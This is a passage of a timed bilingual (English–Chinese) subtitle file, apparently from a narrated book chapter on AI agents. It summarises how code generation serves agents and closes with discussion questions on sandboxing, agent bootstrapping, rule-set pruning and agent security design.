    "start": 8038.751,
    "end": 8043.114,
    "en": "That conclusion deserves to travel to other Agent scenarios.",
    "zh": "这一结论值得推广到其他智能体场景中。"
  },
  {
    "id": 860,
    "start": 8043.114,
    "end": 8058.839,
    "en": "The section on failure and error recovery offers the flip side of the same theme: an Agent's reliability is determined not by whether the model makes mistakes, but by whether every class of failure has a corresponding detection, recovery, handover, and termination path.",
    "zh": "关于失败与错误恢复的部分则揭示了同一主题的另一面：智能体的可靠性并非取决于模型是否犯错，而在于每种类型的失败是否都有相应的检测、恢复、交接和终止路径。"
  },
  {
    "id": 861,
    "start": 8058.839,
    "end": 8067.151,
    "en": "The second part demonstrated the broad value of code generation beyond programming, corresponding to the six dimensions in the main text:",
    "zh": "第二部分展示了代码生成超越编程的广泛价值，对应于正文中的六个维度："
  },
  {
    "id": 862,
    "start": 8067.151,
    "end": 8075.064,
    "en": "Thinking Tool: Leveraging symbolic computation and constraint solving to compensate for the shortcomings of probabilistic thinking",
    "zh": "思维工具：利用符号计算和约束求解来弥补概率性思维的不足"
  },
  {
    "id": 863,
    "start": 8075.064,
    "end": 8087.876,
    "en": "Business Rule Constraints: Expressing business rules unambiguously and providing a deterministic safety backstop for irreversible operations, where the value of the guarantee far exceeds its implementation cost",
    "zh": "业务规则约束：明确表达业务规则，并为不可逆操作提供确定性的安全后盾，其保障价值远超实现成本"
  },
  {
    "id": 864,
    "start": 8087.876,
    "end": 8102.326,
    "en": "Multimedia Generation: Creating multimodal content like PPTs and videos through a Proposer-Reviewer mechanism; the choice between code generation and generative models depends on the artifact's intrinsic complexity and precision requirements",
    "zh": "多媒体生成：通过提议-评审机制创建PPT和视频等多模态内容；代码生成与生成模型的选择取决于成果物的内在复杂性和精确度要求"
  },
  {
    "id": 865,
    "start": 8102.326,
    "end": 8110.664,
    "en": "System Adapter: Automatically following format evolution to achieve full automation of log parsing and problem diagnosis",
    "zh": "系统适配器：自动适应格式演变，实现日志解析和问题诊断的全面自动化"
  },
  {
    "id": 866,
    "start": 8110.664,
    "end": 8121.289,
    "en": "Generative UI: Dynamically creating forms, visualizations, and even complete customizable applications, breaking free from plain text limitations",
    "zh": "生成式用户界面：动态创建表单、可视化界面甚至完整的可定制应用程序，突破纯文本的限制"
  },
  {
    "id": 867,
    "start": 8121.289,
    "end": 8130.139,
    "en": "Agent Bootstrapping: Using code to repair existing Agents and create new ones, ultimately enabling an Agent to create other Agents",
    "zh": "智能体自举：使用代码修复现有智能体并创建新智能体，最终实现智能体创造其他智能体"
  },
  {
    "id": 868,
    "start": 8130.139,
    "end": 8142.751,
    "en": "The value of code to an Agent comes down to this: it is at once a means of getting tasks done and a mechanism for accumulating knowledge, creating tools, and improving itself—a true \"meta-capability.",
    "zh": "代码对智能体的价值归结为一点：它既是完成任务的手段，也是积累知识、创造工具和自我改进的机制——一种真正的“元能力”。"
  },
  {
    "id": 869,
    "start": 8142.751,
    "end": 8155.339,
    "en": "At this point, we have combined context, knowledge, tools, and coding capabilities into the foundational architecture of a general-purpose Agent, with code generation as its most general meta-capability.",
    "zh": "至此，我们已将上下文、知识、工具和编码能力整合到通用智能体的基础架构中，代码生成成为其最通用的元能力。"
  },
  {
    "id": 870,
    "start": 8155.339,
    "end": 8160.751,
    "en": "Yet the first five chapters still assume that the Agent and the world take turns acting.",
    "zh": "然而，前五章仍假设智能体与世界轮流行动。"
  },
  {
    "id": 871,
    "start": 8160.751,
    "end": 8176.939,
    "en": "Chapter 6 fills in the final piece of “Building Agents” by extending the observation and action spaces to asynchronous events, voice, screens, and the physical world; once that piece is in place, Chapter 7 turns to evaluation and continual improvement.",
    "zh": "第6章通过将观察空间和动作空间扩展到异步事件、语音、屏幕和物理世界，填补了“构建智能体”所需的最后一块拼图；一旦这一部分就位，第7章将转向评估和持续改进。"
  },
  {
    "id": 872,
    "start": 8176.939,
    "end": 8178.876,
    "en": "Thought Questions.",
    "zh": "思考问题。"
  },
  {
    "id": 873,
    "start": 8179.036,
    "end": 8185.648,
    "en": "intermediate difficulty, two stars:  Code generation is called an Agent's “meta-capability.",
    "zh": "中等难度，两颗星：代码生成被称为智能体的“元能力”。"
  },
  {
    "id": 874,
    "start": 8185.598,
    "end": 8194.986,
    "en": "But code execution introduces security risks—Agent-generated code may contain vulnerabilities, enter infinite loops, or exhaust resources.",
    "zh": "但代码执行会引入安全风险——智能体生成的代码可能包含漏洞、进入无限循环或耗尽资源。"
  },
  {
    "id": 875,
    "start": 8194.986,
    "end": 8204.261,
    "en": "Sandboxing can mitigate some of these risks, but it also limits what the code can do, for example by denying access to the network or file system.",
    "zh": "沙盒可以缓解一些这些风险，但它也限制了代码能做的事情，例如通过拒绝访问网络或文件系统。"
  },
  {
    "id": 876,
    "start": 8204.261,
    "end": 8208.873,
    "en": "How can the optimal balance between security and capability be found?",
    "zh": "如何找到安全性和功能之间的最佳平衡？"
  },
  {
    "id": 877,
    "start": 8208.873,
    "end": 8218.436,
    "en": "advanced difficulty, three stars:  Agent bootstrapping—an Agent that can create Agents—enables the “self-reproduction of intelligence.",
    "zh": "高级难度，三颗星：智能体自举——一个能够创建智能体的智能体——实现了“智能的自我繁殖”。"
  },
  {
    "id": 878,
    "start": 8218.436,
    "end": 8223.448,
    "en": "But every bootstrapping iteration may introduce new biases or errors.",
    "zh": "但每次自举迭代都可能引入新的偏见或错误。"
  },
  {
    "id": 879,
    "start": 8223.448,
    "end": 8227.011,
    "en": "Will these errors accumulate across generations?",
    "zh": "这些错误会在代际中累积吗？"
  },
  {
    "id": 880,
    "start": 8227.011,
    "end": 8230.786,
    "en": "How can degradation in Agent bootstrapping be prevented?",
    "zh": "如何防止智能体自举中的退化？"
  },
  {
    "id": 881,
    "start": 8230.786,
    "end": 8239.961,
    "en": "intermediate difficulty, two stars:  When a code-generation Agent handles log parsing, it can automatically follow format evolution.",
    "zh": "中等难度，两颗星：当代码生成智能体处理日志解析时，它可以自动适应格式演变。"
  },
  {
    "id": 882,
    "start": 8239.961,
    "end": 8247.736,
    "en": "But if a format change is a bug rather than an intended modification, the Agent's adaptability may instead conceal the problem.",
    "zh": "但如果格式变化是错误而非有意修改，智能体的适应性可能会掩盖这个问题。"
  },
  {
    "id": 883,
    "start": 8247.736,
    "end": 8255.111,
    "en": "How should the Agent distinguish between “a change that requires adaptation” and “an anomaly that requires reporting”?",
    "zh": "智能体应如何区分“需要适应的变化”和“需要报告的异常”？"
  },
  {
    "id": 884,
    "start": 8255.111,
    "end": 8266.023,
    "en": "intermediate difficulty, two stars:  This chapter repeatedly uses the proposer-reviewer mechanism in PPT generation, video editing, and log visualization.",
    "zh": "中等难度，两颗星：本章在PPT生成、视频编辑和日志可视化中反复使用提议者-评审者机制。"
  },
  {
    "id": 885,
    "start": 8266.023,
    "end": 8279.473,
    "en": "If the Reviewer's aesthetic preferences differ from those of the target user—for example, if the Reviewer considers the information density reasonable but the user finds it too crowded—the feedback loop may converge on the wrong local optimum.",
    "zh": "如果评审者的审美偏好与目标用户的不一致——例如，如果评审者认为信息密度合理，但用户觉得过于拥挤——反馈循环可能会收敛到错误的局部最优解。"
  },
  {
    "id": 886,
    "start": 8279.473,
    "end": 8283.911,
    "en": "How can user-preference feedback be incorporated into the Reviewer loop?",
    "zh": "如何将用户偏好反馈整合到评审者循环中？"
  },
  {
    "id": 887,
    "start": 8283.911,
    "end": 8303.873,
    "en": "intermediate difficulty, two stars:  This chapter demonstrates several ways for a Coding Agent to consolidate experience gained through execution and debugging back into the codebase—writing knowledge-base files, updating architecture documentation, maintaining project instruction files, and encoding operational sequences as code.",
    "zh": "中等难度，两颗星：本章展示了编码智能体通过执行和调试将经验整合回代码库的几种方法——编写知识库文件、更新架构文档、维护项目说明文件，并将操作序列编码为代码。"
  },
  {
    "id": 888,
    "start": 8303.873,
    "end": 8311.348,
    "en": "If this experience is further distilled into rules in the system prompt, the rule set will continue to expand over time.",
    "zh": "如果这些经验进一步提炼为系统提示中的规则，规则集将随着时间推移不断扩展。"
  },
  {
    "id": 889,
    "start": 8311.348,
    "end": 8319.011,
    "en": "How can “garbage collection” be performed on the accumulated rules to identify and remove redundant or outdated entries?",
    "zh": "如何对积累的规则进行“垃圾回收”，以识别并删除冗余或过时的条目？"
  },
  {
    "id": 890,
    "start": 8319.011,
    "end": 8325.561,
    "en": "Why is a single successful code modification not yet continuous evolution in the sense of Chapter 9?",
    "zh": "为什么一次成功的代码修改还不能算是第9章意义上的持续演进？"
  },
  {
    "id": 891,
    "start": 8325.561,
    "end": 8333.448,
    "en": "introductory difficulty, one star:  “Teams that are friendly to remote work are often also friendly to AI Agents.",
    "zh": "初级难度，一颗星：“对远程工作友好的团队通常也对AI智能体友好。”"
  },
  {
    "id": 892,
    "start": 8333.448,
    "end": 8339.873,
    "en": "How close is your team or organization to being “AI-ready” in terms of knowledge documentation?",
    "zh": "你的团队或组织在知识文档方面离‘AI就绪’还有多远？"
  },
  {
    "id": 893,
    "start": 8339.873,
    "end": 8342.311,
    "en": "What is the greatest obstacle?",
    "zh": "最大的障碍是什么？"
  },
  {
    "id": 894,
    "start": 8342.311,
    "end": 8355.173,
    "en": "advanced difficulty, three stars:  Simon Willison proposed the “Lethal Triad” for Agents—access to private data, exposure to untrusted content, and external communication capability.",
    "zh": "高级难度，三颗星：西蒙·威利森提出了智能体的“致命三角”—访问私有数据、接触不可信内容以及外部通信能力。"
  },
  {
    "id": 895,
    "start": 8355.173,
    "end": 8359.223,
    "en": "This chapter adds a fourth element: persistent memory.",
    "zh": "本章增加了一个第四要素：持久化记忆。"
  },
  {
    "id": 896,
    "start": 8359.223,
    "end": 8365.761,
    "en": "How would you design a security strategy for a production environment that must handle all four simultaneously?",
    "zh": "你将如何设计一个生产环境的安全策略，以同时处理这四个方面？"
  },
  {
    "id": 897,
    "start": 8365.761,
    "end": 8379.586,
    "en": "intermediate difficulty, two stars:  The Artifact pattern allows an Agent to generate SQL or frontend code for execution by the database and browser, bypassing the need for the LLM to process large volumes of data.",
    "zh": "中等难度，两颗星：Artifact模式允许智能体生成SQL或前端代码供数据库和浏览器执行，无需LLM处理大量数据。"
  },
  {
    "id": 898,
    "start": 8379.586,
    "end": 8391.398,
    "en": "What are the advantages and disadvantages of this division of labor—“the Agent generates code, the system executes code”—compared with the traditional pattern in which the Agent directly provides the answer?",
    "zh": "这种分工——‘智能体生成代码，系统执行代码’——与传统智能体直接提供答案的模式相比，有什么优缺点？"
  },
  {
    "id": 899,
    "start": 8391.398,
    "end": 8399.636,
    "en": "Moreover, generated SQL may perform destructive operations, and generated HTML may contain vulnerabilities.",
    "zh": "此外，生成的SQL可能会执行破坏性操作，生成的HTML可能包含漏洞。"
  },
  {
    "id": 900,
    "start": 8399.636,
    "end": 8402.698,
    "en": "How can the system's security be ensured?",
    "zh": "如何确保系统的安全性？"
  },
  {
    "id": 901,
    "start": 8402.698,
    "end": 8419.386,
    "en": "intermediate difficulty, two stars:  Encoding business rules as checks inside tools against authoritative database records, while using parameter design to guide the model to check policy conditions before making a call, essentially uses code structure to constrain Agent behavior.",
    "zh": "中等难度，两颗星：将业务规则编码为工具中的检查逻辑，以权威数据库记录为依据，同时使用参数设计引导模型在调用前检查政策条件，本质上是通过代码结构来约束智能体的行为。"
  },
  {
    "id": 902,
    "start": 8419.386,
    "end": 8426.686,
    "en": "What are the advantages and limitations of this “code as rules” pattern compared with rules expressed in natural language?",
    "zh": "与以自然语言表达的规则相比，这种“代码即规则”的模式有哪些优势和局限性？"
  }
];
